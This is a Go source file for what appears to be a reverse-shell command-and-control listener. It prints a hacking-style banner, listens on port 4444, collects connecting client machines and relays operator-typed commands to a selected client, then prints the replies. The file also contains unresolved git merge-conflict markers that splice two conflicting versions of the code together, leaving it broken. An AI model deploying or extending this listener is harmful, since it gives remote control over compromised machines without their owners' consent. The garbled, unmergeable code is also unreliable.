package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
<<<<<<< HEAD
	"strconv"
	"strings"
	"sync"
=======
	"strings"
>>>>>>> ea55b048973eefe25b7aa687736b79e024a3b5ff
)

// ClientData represents client information
type ClientData struct {
	ID   int
	Conn net.Conn
}

func main() {
	banner := `
	   ____________                 
	  / ____/_  __/                 
	 / / __  / /                    
	/ /_/ / / /                     
	\____/ /_/                      
									
	   ____  _____________          
	  / __ \/ __/ __/ ___/___  _____
	 / / / / /_/ /_ \__ \/ _ \/ ___/
	/ /_/ / __/ __/___/ /  __/ /__  
	\____/_/ /_/  /____/\___/\___/  
	`

	red := "\x1b[0;31m"
	reset := "\x1b[0m"

	coloredBanner := red + banner + reset
	fmt.Println(coloredBanner)

	ip := "127.0.0.1:4444"

	listener, err := net.Listen("tcp", ip)
	if err != nil {
		fmt.Println("Error listening:", err)
		return
	}
	defer listener.Close()

	fmt.Println("Server is listening on", ip)

	var clients = make(map[int]ClientData)
	var clientMutex sync.Mutex
	var clientID = 0

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			return
		}

		clientMutex.Lock()
		clients[clientID] = ClientData{ID: clientID, Conn: conn}
		currentClientID := clientID
		clientID++
		clientMutex.Unlock()

		go handleClientConnection(conn, clients[currentClientID], &clientMutex, clients)
	}
<<<<<<< HEAD
=======
}

type Client struct {
	Name   string
	Socket net.Conn
>>>>>>> ea55b048973eefe25b7aa687736b79e024a3b5ff
}

func handleClientConnection(conn net.Conn, clientData ClientData, mutex *sync.Mutex, clients map[int]ClientData) {
	defer conn.Close()

	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Printf("Client %d -> ", clientData.ID)

		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)

		if command == "exit" {
			fmt.Println("Exiting server.")
			return
		}

		parts := strings.Fields(command)
		if len(parts) >= 2 && parts[0] == "set" {
			clientID, err := strconv.Atoi(parts[1])
			if err != nil {
				fmt.Println("Invalid client ID.")
				continue
			}
			mutex.Lock()
			if client, exists := clients[clientID]; exists {
				clientData = client
				fmt.Printf("Selected client %d.\n", clientID)
			} else {
				fmt.Println("Client ID does not exist.")
				continue
			}
			mutex.Unlock()
		}

		_, err := conn.Write([]byte(command + "\n"))
		if err != nil {
			fmt.Println("Error sending command:", err)
			return
		}

		readResponse(conn)
	}
}

func readResponse(conn net.Conn) {
	reader := bufio.NewReader(conn)
	for {
		response, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error receiving response:", err)
			return
		}

		response = strings.TrimSpace(response)

<<<<<<< HEAD
		if response == "END_OF_RESPONSE" {
			return
		}

		fmt.Println(response)
	}
}
=======
// func main() {
// 	banner := `
// 	   ____________
// 	  / ____/_  __/
// 	 / / __  / /
// 	/ /_/ / / /
// 	\____/ /_/

// 	   ____  _____________
// 	  / __ \/ __/ __/ ___/___  _____
// 	 / / / / /_/ /_ \__ \/ _ \/ ___/
// 	/ /_/ / __/ __/___/ /  __/ /__
// 	\____/_/ /_/  /____/\___/\___/
// 			`
// 	red := "\x1b[0;31m"
// 	reset := "\x1b[0m"

// 	coloredBanner := red + banner + reset
// 	fmt.Println(coloredBanner)

// 	server := NewServer("127.0.0.1", "4444")
// 	addr := server.IP + ":" + server.Port
// 	serverSocket, err := net.Listen("tcp", addr)
// 	if err != nil {
// 		fmt.Println(err)
// 		fmt.Println("Couldn't bind and start listening on specified parameters.")
// 		os.Exit(1)
// 	}
// 	server.ServerSocket = serverSocket
// 	go server.AcceptConnections()
// 	server.Shell()
// }
>>>>>>> ea55b048973eefe25b7aa687736b79e024a3b5ff
